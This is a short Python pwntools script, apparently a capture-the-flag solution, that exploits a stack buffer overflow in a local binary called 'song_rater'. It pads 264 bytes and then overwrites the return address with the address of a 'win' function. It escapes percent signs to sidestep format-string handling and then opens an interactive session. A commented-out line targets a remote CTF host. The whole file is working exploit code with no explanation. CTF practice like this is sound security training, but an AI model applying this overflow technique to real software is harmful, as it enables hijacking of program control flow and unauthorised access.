from pwn import *
import time

binary_path = "./song_rater"

# Win function
scratched_record_addr = 0x00401196

p = process('./song_rater')
#p = remote("xxxxx.ctf.kitctf.de", "443", ssl=True)
#p = gdb.debug(binary_path,  terminal=['tmux', 'new-window'])

time.sleep(1)
print(p.recv())

payload = b"A" * 256  
payload += b"B" * 8   
payload += p64(scratched_record_addr)

# Clean the payload from format strings 
clean_payload = payload.replace(b"%", b"%%")

p.sendline(clean_payload)

p.interactive()
